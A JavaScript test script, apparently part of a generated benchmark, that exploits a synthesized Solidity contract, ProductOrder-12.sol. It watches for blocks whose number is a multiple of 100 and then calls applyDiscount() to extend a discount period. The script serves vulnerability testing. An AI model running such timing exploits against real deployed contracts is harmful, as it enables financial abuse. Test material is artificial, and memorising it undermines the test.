require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');


const { createLoggerWeb3 } = require('@lib/web3/deploy');

const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-12.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');


async function exploit(web3, envInfo, contractAddress) {
    try {   
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, contractFileFullName, 'ProductOrder', solcVersion);
        
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        // Monitor the blockchain to execute applyDiscount at a specific block number
        web3.eth.subscribe('newBlockHeaders', async (error, result) => {
            if (!error) {
                if (result.number % 100 === 0) {  // Check for the special block number condition
                    let receipt = await contractInstance.methods.applyDiscount().send({
                        from: web3.eth.accounts.wallet[0].address,
                        gas: 3000000
                    });
                    await sleep(200);

                    if (receipt.status) {
                        console.log(`Discount applied successfully at block ${result.number}`);
                        // Optionally verify the new discountEndTime
                        let newEndTime = await contractInstance.methods.discountEndTime().call();
                        console.log(`New discount end time: ${newEndTime}`);
                        process.exit(0); // Exit after successful execution
                    }
                }
            } else {
                console.error("Error subscribing to block headers:", error);
                process.exit(1); // Exit on error
            }
        });
    } catch (error) {
        console.error("Failed to execute exploit due to:", error.stack);
        return false;
    }
}





module.exports = async function runTests(web3, envInfo, contractAddress) {
    web3 = await createLoggerWeb3(web3);
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
